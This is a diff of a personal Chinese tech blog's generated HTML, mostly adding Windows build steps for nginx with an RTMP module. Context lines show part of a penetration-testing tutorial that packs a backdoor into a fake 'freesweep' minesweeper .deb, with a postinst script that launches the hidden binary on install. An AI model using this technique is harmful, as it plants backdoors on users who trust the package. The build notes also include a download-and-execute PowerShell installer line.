@@ -253,7 +253,7 @@
 <p>-e :编码器 可以通过命令 –list encoders 列出可用的编码器</p>
 <p>拓展生成软件包时无论是payload和软件包都要选择能够在目标操作系统上执行的</p>
 <p><strong>step 4 创建软件包信息目录</strong></p>
-<p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;control &lt;&lt;bye<br>Package:freesweep<br>Version:1.0.1-1<br>Section:Games and Amusement<br>Priority:optional<br>Architecture:amd64<br>Maintainer:Ubuntu MOTU Developers (<a href="mailto:&#x75;&#98;&#x75;&#110;&#116;&#117;&#x2d;&#109;&#x6f;&#116;&#117;&#x40;&#x6c;&#x69;&#x73;&#116;&#x73;&#46;&#x75;&#x62;&#117;&#x6e;&#x74;&#117;&#46;&#x63;&#111;&#109;">&#x75;&#98;&#x75;&#110;&#116;&#117;&#x2d;&#109;&#x6f;&#116;&#117;&#x40;&#x6c;&#x69;&#x73;&#116;&#x73;&#46;&#x75;&#x62;&#117;&#x6e;&#x74;&#117;&#46;&#x63;&#111;&#109;</a>)<br>Description:a text-based minesweeper<br>freesweep is an im plementation of the popular minesweeper games,where one tries to find all the <br>mines without igniting any,based on hints given by the computer.<br>bye</p>
+<p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;control &lt;&lt;bye<br>Package:freesweep<br>Version:1.0.1-1<br>Section:Games and Amusement<br>Priority:optional<br>Architecture:amd64<br>Maintainer:Ubuntu MOTU Developers (<a href="mailto:&#117;&#98;&#117;&#x6e;&#116;&#x75;&#x2d;&#109;&#x6f;&#116;&#117;&#x40;&#108;&#105;&#115;&#116;&#x73;&#x2e;&#x75;&#98;&#117;&#110;&#116;&#x75;&#x2e;&#99;&#x6f;&#109;">&#117;&#98;&#117;&#x6e;&#116;&#x75;&#x2d;&#109;&#x6f;&#116;&#117;&#x40;&#108;&#105;&#115;&#116;&#x73;&#x2e;&#x75;&#98;&#117;&#110;&#116;&#x75;&#x2e;&#99;&#x6f;&#109;</a>)<br>Description:a text-based minesweeper<br>freesweep is an im plementation of the popular minesweeper games,where one tries to find all the <br>mines without igniting any,based on hints given by the computer.<br>bye</p>
 <p><strong>step 5创建deb软件包安装脚本文件，来加载后门</strong>**</p>
 <p>tee &#x2F;root&#x2F;free&#x2F;DEBIAN&#x2F;postinst &lt;&lt;bye<br>#!&#x2F;bin&#x2F;bash<br>sudo chmod 2755 usr&#x2F;games&#x2F;freesweep_sources<br>sudo usr&#x2F;games&#x2F;freesweep_souces &amp;<br>bye</p>
 <p>ps:创建完成文件需要给文件赋权 (必须 &gt;&#x3D;0555 且 &lt;&#x3D;0775)</p>
@@ -636,7 +636,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/06/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cl4n1j915000494uge7n0douc" data-title="" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/06/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" data-id="cl4sm8r900004ggug3d1b8dbe" data-title="" class="article-share-link">Share</a>
       
       
       
@@ -673,11 +673,33 @@
         <h1 id="nginx-编译支持rtmp直播模块"><a href="#nginx-编译支持rtmp直播模块" class="headerlink" title="nginx 编译支持rtmp直播模块"></a>nginx 编译支持rtmp直播模块</h1><p>Step 1 编译准备</p>
 <p>编译前的准备工作，是下载可用的编译源码，编译平台本文选择使用centos 进行编译</p>
 <p>.&#x2F;configure –builddir&#x3D;build –prefix&#x3D; <br>–conf-path&#x3D;conf&#x2F;nginx.conf –pid-path&#x3D;logs&#x2F;nginx.pid <br>–http-log-path&#x3D;logs&#x2F;access.log –error-log-path&#x3D;logs&#x2F;error.log <br>–sbin-path&#x3D;nginx.exe –http-client-body-temp-path&#x3D;temp&#x2F;client_body_temp <br>–http-proxy-temp-path&#x3D;temp&#x2F;proxy_temp <br>–http-fastcgi-temp-path&#x3D;temp&#x2F;fastcgi_temp <br>–with-cc-opt&#x3D;-DFD_SETSIZE&#x3D;1024 –with-pcre&#x3D;build&#x2F;lib&#x2F;pcre-8.39 <br>–with-zlib&#x3D;build&#x2F;lib&#x2F;zlib-1.2.8 –with-openssl&#x3D;build&#x2F;lib&#x2F;openssl-1.0.1s <br>–with-select_module –with-http_ssl_module –with-ipv6 <br>–with-http_sub_module <br>–add-module&#x3D;build&#x2F;lib&#x2F;nginx-rtmp-module</p>
+<p>编译环境：</p>
+<p>1.virsual studio 17.2.4 2022  需要的空间比较大（5GB）</p>
+<p><img src="C:\Users\Thaygo\AppData\Roaming\Typora\typora-user-images\image-20220623002706217.png" alt="image-20220623002706217"></p>
+<p>2.MYSY  或者 MYSY2</p>
+<p><img src="C:\Users\Thaygo\AppData\Roaming\Typora\typora-user-images\image-20220623010013738.png" alt="image-20220623010013738"></p>
+<p>下载msys2:<a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/msys2/distrib/">Index of &#x2F;msys2&#x2F;distrib&#x2F; | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
+<p>下载合适架构的exe文件</p>
+<p>3.安装perl 5.3.4</p>
+<p>powershell -Command “&amp; $([scriptblock]::Create((New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://platform.activestate.com/dl/cli/_AS701/install.ps1&#39;">https://platform.activestate.com/dl/cli/_AS701/install.ps1&#39;</a>))) -c’state activate –default Trumpgodie&#x2F;Perl-5.36.0-Windows’”</p>
+<p>4.下载安装git</p>
+<p>nginx的编译过程：</p>
+<p>1、clone nginx 代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nginx/nginx.git</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、2、准备代码库</p>
+<p>需要openssl、zlib和pcre三个库，您可以从官网上下载，也可以从我的网盘里抓。都可以，如果从官网下载需要注意的就是版本号，在configure的时候注意版本调整即可。</p>
+<p>步骤简单，将三个tar包加压到新建的目录objs\lib 中。</p>
+<p>3.3、编译配置</p>
+<p>到msys的bin目录中启动bash.exe。其他方法也行，不强求，但要保证exe启对了。<br>切换到nginx目录下，运行：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto/configure --<span class="keyword">with</span>-cc=cl --<span class="keyword">with</span>-debug --prefix= --conf-path=conf/nginx.conf --pid-path=logs/nginx.pid --http-log-path=logs/access.log --error-log-path=logs/error.log --sbin-path=nginx.exe --<span class="keyword">with</span>-cc-opt=-DFD_SETSIZE=<span class="number">1024</span>  --<span class="keyword">with</span>-openssl-opt=no-asm --<span class="keyword">with</span>-select_module --<span class="keyword">with</span>-openssl=objs/lib/openssl<span class="number">-1.1</span><span class="number">.1</span>g --<span class="keyword">with</span>-openssl-opt=no-asm --<span class="keyword">with</span>-zlib=objs/lib/zlib<span class="number">-1.2</span><span class="number">.12</span> --<span class="keyword">with</span>-pcre=objs/lib/pcre<span class="number">-8.45</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/06/20/nginx-with-rtmp-buiding/" data-id="cl4n1j911000194ugfshvafbd" data-title="nginx with rtmp buiding" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/06/20/nginx-with-rtmp-buiding/" data-id="cl4sm8r8u0001ggug0l4l2h4n" data-title="nginx with rtmp buiding" class="article-share-link">Share</a>
       
       
       
@@ -717,7 +739,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/06/20/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog/" data-id="cl4n1j912000294ug8fhs21q1" data-title="我的第一篇blog" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/06/20/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87blog/" data-id="cl4sm8r950006ggugcfy3egbu" data-title="我的第一篇blog" class="article-share-link">Share</a>
       
       
       
@@ -768,7 +790,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/06/19/hello-world/" data-id="cl4n1j90x000094ughcs3ai5d" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/06/19/hello-world/" data-id="cl4sm8r8x0002ggug5b7ggx4r" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
